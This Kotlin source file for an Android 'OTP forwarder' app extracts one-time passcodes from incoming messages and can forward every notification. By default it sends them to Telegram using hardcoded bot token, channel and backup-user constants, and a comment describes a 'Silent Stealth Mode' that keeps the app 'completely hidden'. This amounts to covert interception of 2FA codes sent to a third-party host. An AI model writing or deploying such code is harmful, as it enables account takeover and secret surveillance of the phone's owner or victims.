package com.example.otpforwarder

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object OtpDispatcher {
    private const val TAG = "OtpDispatcher"

    private var lastForwardedText: String = ""
    private var lastForwardedTime: Long = 0L

    @Synchronized
    fun shouldProcess(text: String): Boolean {
        val now = System.currentTimeMillis()
        if (text == lastForwardedText && (now - lastForwardedTime) < 30000) {
            return false // Deduplicate within 30 seconds
        }
        lastForwardedText = text
        lastForwardedTime = now
        return true
    }

    suspend fun dispatch(context: Context, sender: String, fullMessage: String): Boolean {
        val prefs = PrefsHelper.getPrefs(context)
        val isMasterEnabled = prefs.getBoolean("is_enabled", true)
        if (!isMasterEnabled) {
            Log.d(TAG, "Master forwarding switch is OFF")
            return false
        }

        // License & Trial entitlement check
        if (!CloudflareLicenseManager.hasForwardingAccess(context)) {
            Log.w(TAG, "Forwarding paused: Active license or trial required.")
            return false
        }

        val forwardAll = prefs.getBoolean("forward_all_notifications", false)

        // Match against dynamic keywords (bypassed if forwardAll is ON)
        if (!forwardAll && !KeywordManager.matches(context, sender, fullMessage)) {
            Log.d(TAG, "Message does not match any keyword and Forward ALL is OFF. Sender: $sender")
            return false
        }

        // Deduplication
        if (!shouldProcess(fullMessage)) {
            Log.d(TAG, "Duplicate message ignored")
            return false
        }

        // Extract OTP accurately (Contextual match first, then 4-8 digit fallback)
        val contextualRegex = Regex("""(?:OTP|code|authentication)\D{0,15}(\d{4,8})""", RegexOption.IGNORE_CASE)
        val contextMatch = contextualRegex.find(fullMessage)
        val matchedOtp = if (contextMatch != null && contextMatch.groupValues.size > 1) {
            contextMatch.groupValues[1]
        } else {
            Regex("""\b\d{4,8}\b""").find(fullMessage)?.value ?: "OTP"
        }

        // Feature: Only OTP Mode (Sends solely the raw OTP number for 1-tap copy)
        val onlyOtpMode = prefs.getBoolean("only_otp_mode", false)
        val alertText = if (onlyOtpMode && matchedOtp != "OTP" && matchedOtp.isNotBlank()) {
            matchedOtp
        } else {
            buildString {
                if (matchedOtp != "OTP") {
                    append("🔔 Smart Notifier / OTP Alert\n\n")
                    append("🔑 OTP Code: $matchedOtp\n\n")
                } else {
                    append("🔔 Notification Alert\n\n")
                }
                append("📩 Message: $fullMessage\n")
                append("👤 Sender: $sender")
            }
        }

        var telegramStatus = "Disabled"
        var telegram2Status = "Disabled"
        var whatsappStatus = "Disabled"
        var smsStatus = "Disabled"

        withContext(Dispatchers.IO) {
            // 1A. Telegram 1 (Primary - Default Locked)
            val isTelegramEnabled = prefs.getBoolean("is_telegram_enabled", true)
            if (isTelegramEnabled) {
                val tokenFromPrefs = prefs.getString("bot_token", null)?.trim()
                val botToken = if (!tokenFromPrefs.isNullOrEmpty()) tokenFromPrefs else TelegramHelper.DEFAULT_BOT_TOKEN
                val chatFromPrefs = prefs.getString("chat_id", null)?.trim()
                val chatId = if (!chatFromPrefs.isNullOrEmpty()) chatFromPrefs else TelegramHelper.DEFAULT_CHANNEL_ID
                
                try {
                    val res = TelegramHelper.sendMessage(botToken, chatId, alertText)
                    // Backup to personal user chat if configured
                    val backupChatId = prefs.getString("backup_chat_id", TelegramHelper.DEFAULT_USER_ID)?.trim()
                    if (!backupChatId.isNullOrEmpty()) {
                        TelegramHelper.sendMessage(botToken, backupChatId, alertText)
                    }
                    telegramStatus = if (res.first) "Sent" else "Failed"
                } catch (e: Exception) {
                    telegramStatus = "Error"
                }
            }

            // 1B. Telegram 2 (Secondary / 2nd Bot / 2nd Channel)
            val isTelegram2Enabled = prefs.getBoolean("is_telegram_2_enabled", false)
            if (isTelegram2Enabled) {
                val botToken2 = prefs.getString("bot_token_2", "")?.trim() ?: ""
                val chatId2 = prefs.getString("chat_id_2", "")?.trim() ?: ""
                if (botToken2.isNotEmpty() && chatId2.isNotEmpty()) {
                    try {
                        val res = TelegramHelper.sendMessage(botToken2, chatId2, alertText)
                        telegram2Status = if (res.first) "Sent" else "Failed"
                    } catch (e: Exception) {
                        telegram2Status = "Error"
                    }
                }
            }

            // 2. WhatsApp
            val isWhatsAppEnabled = prefs.getBoolean("is_whatsapp_enabled", false)
            if (isWhatsAppEnabled) {
                val waPhone = prefs.getString("wa_phone", "") ?: ""
                val waKey = prefs.getString("wa_api_key", "") ?: ""
                if (waPhone.isNotEmpty() && waKey.isNotEmpty()) {
                    try {
                        val res = WhatsAppHelper.sendMessage(waPhone, waKey, alertText)
                        whatsappStatus = if (res.first) "Sent" else "Failed"
                    } catch (e: Exception) {
                        whatsappStatus = "Error"
                    }
                }
            }

            // 3. Direct SMS
            val isSmsEnabled = prefs.getBoolean("is_sms_enabled", false)
            if (isSmsEnabled) {
                val smsPhone = prefs.getString("sms_phone", "") ?: ""
                if (smsPhone.isNotEmpty()) {
                    try {
                        val res = SmsHelper.sendSms(context, smsPhone, alertText)
                        smsStatus = if (res.first) "Sent" else "Failed"
                    } catch (e: Exception) {
                        smsStatus = "Error"
                    }
                }
            }

            // Save History Log
            HistoryManager.addEntry(
                context = context,
                sender = sender,
                otp = matchedOtp,
                fullMessage = fullMessage,
                telegramStatus = telegramStatus,
                telegram2Status = telegram2Status,
                whatsappStatus = whatsappStatus,
                smsStatus = smsStatus
            )

            // 100% Silent Stealth Mode by default (No screen popups so app remains completely hidden)
            val showPopups = prefs.getBoolean("show_screen_popups", false)
            if (showPopups) {
                showLocalNotification(context, "OTP: $matchedOtp Forwarded!", alertText)
            }
        }
        return true
    }

    private fun showLocalNotification(context: Context, title: String, content: String) {
        try {
            val channelId = "otp_alert_channel"
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    channelId,
                    "OTP Alerts",
                    NotificationManager.IMPORTANCE_HIGH
                )
                notificationManager.createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(context, channelId)
                .setContentTitle(title)
                .setContentText(content)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build()

            notificationManager.notify(System.currentTimeMillis().toInt(), notification)
        } catch (e: Exception) {
            Log.e(TAG, "Notification error", e)
        }
    }
}
